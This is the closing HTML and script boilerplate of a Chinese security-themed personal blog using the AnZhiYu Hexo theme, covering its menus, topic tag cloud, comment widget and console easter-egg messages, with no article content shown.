"data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 0.88rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 0.88rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 0.88rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 0.88rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 0.88rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 0.88rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 0.88rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 0.88rem;">TryHackMe<sup>42</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 0.88rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 0.88rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 0.88rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 0.88rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="is-center" id="loading-database"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-pulse-icon"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/medium-zoom@1.1.0/dist/medium-zoom.min.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("04/01/2021 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎使用安知鱼!`,
    `生活明朗, 万物可爱`,
    `
        
       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
        
        `,
    "已上线",
    dnum,
    "天",
    "©2020 By 安知鱼 V1.6.12",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 hybcx 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>(() => {
  const initValine = () => {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
      appKey: 'iEFJUGMm2FY91n9ZG1gdKBSy',
      avatar: 'mp',
      serverURLs: '',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  const loadValine = async () => {
    if (typeof Valine === 'function') initValine()
    else {
      await getScript('https://cdn.cbd.int/valine@1.5.1/dist/Valine.min.js')
      initValine()
    }
  }

  if ('Valine' === 'Valine' || !false) {
    if (false) anzhiyu.loadComment(document.getElementById('vcomment'),loadValine)
    else setTimeout(loadValine, 0)
  } else {
    window.loadOtherComment = loadValine
  }
})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script src="https://cdn.cbd.int/blueimp-md5@2.19.0/js/md5.min.js"></script><script>window.addEventListener('load', () => {
  const changeContent = (content) => {
    if (content === '') return content

    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
    content = content.replace(/<[^>]+>/g,"") // remove html tag

    if (content.length > 150) {
      content = content.substring(0,150) + '...'
    }
    return content
  }

  const getIcon = (icon, mail) => {
    if (icon) return icon
    let defaultIcon = '?d=mp'
    let iconUrl = `https://gravatar.loli.net/avatar/${md5(mail.toLowerCase()) + defaultIcon}`
    return iconUrl
  }

  const generateHtml = array => {
    let result = ''

    if (array.length) {
      for (let i = 0; i < array.length; i++) {
        result += '<div class=\'aside-list-item\'>'

        if (true) {
          const name = 'data-lazy-src'
          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'></a>`
        }

        result += `<div class='content'>
        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
        <div class='name'><span>${array[i].nick} / </span><time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
        </div></div>`
      }
    } else {
      result += '没有评论'
    }

    let $dom = document.querySelector('#card-newest-comments .aside-list')
    $dom && ($dom.innerHTML= result)
    window.lazyLoadInstance && window.lazyLoadInstance.update()
    window.pjax && window.pjax.refresh($dom)
  }

  const getComment = () => {
    const serverURL = 'https://7Sc5uZwc.api.lncldglobal.com'

    var settings = {
      "method": "GET",
      "headers": {
        "X-LC-Id": '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
        "X-LC-Key": 'iEFJUGMm2FY91n9ZG1gdKBSy',
        "Content-Type": "application/json"
      },
    }

    fetch(`${serverURL}/1.1/classes/Comment?limit=6&order=-createdAt`,settings)
      .then(response => response.json())
      .then(data => {
        const valineArray = data.results.map(function (e) {
          return {
            'avatar': getIcon(e.QQAvatar, e.mail),
            'content': changeContent(e.comment),
            'nick': e.nick,
            'url': e.url + '#' + e.objectId,
            'date': e.updatedAt,
          }
        })
        saveToLocal.set('valine-newest-comments', JSON.stringify(valineArray), 10/(60*24))
        generateHtml(valineArray)
      }).catch(e => {
        const $dom = document.querySelector('#card-newest-comments .aside-list')
        $dom.textContent= "无法获取评论，请确认相关配置是否正确"
      }) 
  }

  const newestCommentInit = () => {
    if (document.querySelector('#card-newest-comments .aside-list')) {
      const data = saveToLocal.get('valine-newest-comments')
      if (data) {
        generateHtml(JSON.parse(data))
      } else {
        getComment()
      }
    }
  }

  newestCommentInit()
  document.addEventListener('pjax:complete', newestCommentInit)
})</script><script async data-pjax src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.1/bubble/bubble.js"></script><script>var visitorMail = "";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><script src="/js/anzhiyu/right_click_menu.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>